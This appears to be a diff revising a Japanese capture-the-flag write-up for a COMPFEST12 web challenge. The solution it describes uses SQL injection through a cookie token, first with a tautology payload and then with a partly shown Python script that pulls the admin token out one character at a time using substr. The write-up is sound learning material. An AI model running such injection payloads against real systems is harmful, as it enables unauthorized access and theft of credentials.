@@ -6,22 +6,26 @@ Hint
 I think the token is saved in database  
 
 # Solution
-アクセスするとNoPass.htmlがある。  
-LoginページではUsernameのみでログインできるようだ。  
+アクセスすると[NoPass.html](NoPass.html)がある。  
+LoginページではUsernameのみでログインできるようだ。 
+Login  
+[site.png](site/site.png)  
 ただし重複はブロックされるので、adminでのログインはできないようだ。  
-abc0123でログインすると、Dashboard.htmlとFlag.htmlが表示されるがflagは無いようだ。  
+abc0123でログインすると、[Dashboard.html](Dashboard.html)と[Flag.html](Flag.html)が表示されるが、flagは無いようだ。  
 cookieに以下のtokenが入っていた。  
 ```text
 jv4hdNnATkfkHba1NIfl7PWq9tF2mQbY
 ```
-これを以下に書き換える。  
+tokenにシングルクォートを含めるとサーバーエラーが発生した。  
+SQLインジェクションを狙って以下を設定する。   
 ```text
 ' OR 't' = 't' --
 ```
-するとDashboard_admin.htmlとFlag_admin.htmlが表示されるがflagは無いようだ。  
+すると[Dashboard_admin.html](Dashboard_admin.html)と[Flag_admin.html](Flag_admin.html)が表示されるが、flagは無いようだ。  
 ここでflagがadminのtokenだと気付く(問題文に書いてあった)。  
-あとは以下のtoooooken.pyで人文字ずつ探せばよい。  
-likeは大文字小文字の区別がないので困る。  
+あとは以下のtoooooken.pyで一文字ずつ探せばよい。  
+文字列flag.txtが含まれているか否かで正誤判定を行った。  
+likeは大文字小文字の区別がないので、substrを使う。  
 ```python:toooooken.py
 import requests
 
@@ -31,7 +35,7 @@ flag = "COMPFEST12{"
 i = 12
 
 while True:
-	for j in "}[]0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_":
+	for j in "}-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_":
 		cookie = {"token": "' OR username = 'admin' AND substr(token,{},1) ='{}' --".format(i,j)}
 		response = requests.get(url=url, cookies=cookie)
 		if "flag.txt" in response.text:
